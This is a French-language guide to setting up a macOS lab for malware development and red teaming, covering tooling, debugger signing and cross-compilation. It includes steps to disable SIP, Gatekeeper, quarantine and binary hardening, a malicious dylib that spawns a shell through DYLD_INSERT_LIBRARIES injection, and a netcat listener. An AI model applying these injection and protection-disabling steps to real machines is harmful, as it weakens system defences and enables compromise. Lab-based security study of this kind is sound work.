# Setup macOS pour Offensive Security

## Vue d'ensemble

Configuration macOS (physique ou VM) pour développement malware et Red Team.

**Note**: macOS en VM nécessite hardware Apple (légal) ou patches (zone grise).

## Configuration recommandée

- **macOS**: Ventura (13.x) ou Sonoma (14.x)
- **Xcode**: Version récente
- **SIP**: Désactivé pour certains tests

## Installation Xcode et Command Line Tools

```bash
# Installer Command Line Tools
xcode-select --install

# Ou Xcode complet (depuis App Store)
# Puis:
sudo xcodebuild -license accept
```

## Homebrew et outils

```bash
# Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Outils de base
brew install gcc cmake nasm radare2
brew install binutils coreutils

# GDB (nécessite code signing)
brew install gdb

# Python tools
pip3 install pwntools capstone keystone-engine
```

## LLDB configuration

```bash
# LLDB est inclus avec Xcode
# Configuration ~/.lldbinit
cat << 'EOF' > ~/.lldbinit
settings set target.x86-disassembly-flavor intel
settings set target.process.stop-on-exec false

# Auto-show registers et code
target stop-hook add
    register read rax rbx rcx rdx rsi rdi rbp rsp rip
    disassemble --pc
    DONE
EOF
```

## Désactiver SIP (System Integrity Protection)

**ATTENTION**: Désactive protections système. Lab uniquement.

```bash
# 1. Reboot en Recovery Mode
#    Intel: Cmd+R au boot
#    Apple Silicon: Power button long press

# 2. Terminal dans Recovery
csrutil disable

# 3. Reboot
reboot

# Vérifier
csrutil status
# Output: "System Integrity Protection status: disabled."
```

## Gatekeeper et Code Signing

### Désactiver Gatekeeper (temporaire)
```bash
sudo spctl --master-disable
```

### Self-signing pour GDB
```bash
# Créer certificat de code signing
# Keychain Access → Certificate Assistant → Create a Certificate
#   Name: gdb-cert
#   Identity Type: Self Signed Root
#   Certificate Type: Code Signing
#   Let me override defaults: Check

# Signer GDB
codesign -fs gdb-cert $(which gdb)

# Entitlements pour debugging
cat << 'EOF' > gdb-entitlement.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.debugger</key>
    <true/>
</dict>
</plist>
EOF

codesign --entitlements gdb-entitlement.xml -fs gdb-cert $(which gdb)
```

## Cross-compilation

### Vers Linux x64
```bash
# Installer cross-compiler (via source)
brew install FiloSottile/musl-cross/musl-cross
```

### Vers Windows
```bash
brew install mingw-w64
```

### Vers ARM64
```bash
# Déjà supporté sur Apple Silicon
# Sur Intel, utiliser clang avec target
clang -target aarch64-apple-macos source.c -o binary
```

## Outils d'analyse

### Hopper Disassembler
```bash
# Version demo
# https://www.hopperapp.com/download.html
```

### MachOView
```bash
# Analyser Mach-O binaries
# https://github.com/gdbinit/MachOView
```

### class-dump
```bash
# Extraire headers Objective-C
brew install class-dump
```

## Structure lab

```bash
mkdir -p ~/lab/{src,bin,payloads,dylibs,logs}

# Aliases
cat << 'EOF' >> ~/.zshrc
alias lab='cd ~/lab'
alias compile='clang -o bin/$(basename $1 .c) $1'
alias compilearm='clang -arch arm64 -o bin/$(basename $1 .c) $1'
alias compilex64='clang -arch x86_64 -o bin/$(basename $1 .c) $1'
alias compileuniv='clang -arch x86_64 -arch arm64 -o bin/$(basename $1 .c) $1'
EOF

source ~/.zshrc
```

## DYLD injection (DLL-style)

### Créer dylib malveillante
```bash
# payload.c
cat << 'EOF' > payload.c
#include <syslog.h>
__attribute__((constructor))
void init() {
    syslog(LOG_ERR, "[+] Dylib loaded!");
    system("/bin/sh");
}
EOF

# Compiler
clang -dynamiclib payload.c -o payload.dylib

# Injecter
DYLD_INSERT_LIBRARIES=./payload.dylib /bin/ls
```

**Note**: SIP bloque DYLD_INSERT_LIBRARIES sur binaires système.

## Désactiver protections binaires

```bash
# Compiler sans hardening
clang source.c -o binary \
    -Wl,-no_pie \
    -fno-stack-protector \
    -D_FORTIFY_SOURCE=0

# Pour injection
clang source.c -o binary \
    -Wl,-no_code_signature_required
```

## Task_for_pid et debugging

### Activer task_for_pid
```bash
# Nécessite entitlement ou root

# Créer entitlement.plist
cat << 'EOF' > entitlement.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.debugger</key>
    <true/>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
EOF

# Signer binaire
codesign -s - --entitlements entitlement.plist -f binary
```

## Réseau lab

```bash
# Interface loopback pour tests
sudo ifconfig lo0 alias 127.0.0.2

# Listener
nc -l 127.0.0.1 4444

# Cleanup
sudo ifconfig lo0 -alias 127.0.0.2
```

## Kernel debugging (avancé)

```bash
# Activer kernel debugging
sudo nvram boot-args="debug=0x144"
sudo reboot

# Avec deux machines (Target + Debugger)
# Setup complexe, voir Apple doc
```

## Tips macOS specific

### 1. Hardened Runtime bypass
```bash
# Signer sans hardened runtime
codesign -s - --timestamp=none binary
```

### 2. Analyser binaire
```bash
# Architecture
file binary
lipo -info binary

# Dependencies
otool -L binary

# Entitlements
codesign -d --entitlements - binary

# Code signature
codesign -dvvv binary
```

### 3. Process monitoring
```bash
# fs_usage (filesystem)
sudo fs_usage -w -f filesys

# dtrace (syscalls)
sudo dtrace -n 'syscall:::entry { @[probefunc] = count(); }'
```

## Scripts utiles

### disable_protections.sh
```bash
#!/bin/bash
# Désactiver protections pour lab

echo "[*] Disabling Gatekeeper..."
sudo spctl --master-disable

echo "[*] Disabling quarantine..."
xattr -r -d com.apple.quarantine ~/lab

echo "[+] Done"
```

### auto_sign.sh
```bash
#!/bin/bash
# Signer automatiquement binaires lab

for bin in bin/*; do
    echo "[*] Signing $bin..."
    codesign -s - --entitlements entitlement.plist -f "$bin"
done
```

## VM macOS (optionnel)

### UTM (Apple Silicon)
```bash
# Télécharger UTM
# https://mac.getutm.app/

# Installer macOS dans VM
# Nécessite fichier IPSW depuis Apple
```

## Sécurité

**IMPORTANT**:
- SIP désactivé = risques sécurité
- Ne pas utiliser comme machine principale
- Restaurer SIP après tests: `csrutil enable`
- Gatekeeper: réactiver après tests

## Ressources

- [Apple Developer Documentation](https://developer.apple.com/documentation/)
- [Objective-See Tools](https://objective-see.org/tools.html)
- [macOS Internals (Jonathan Levin)](http://newosxbook.com/)
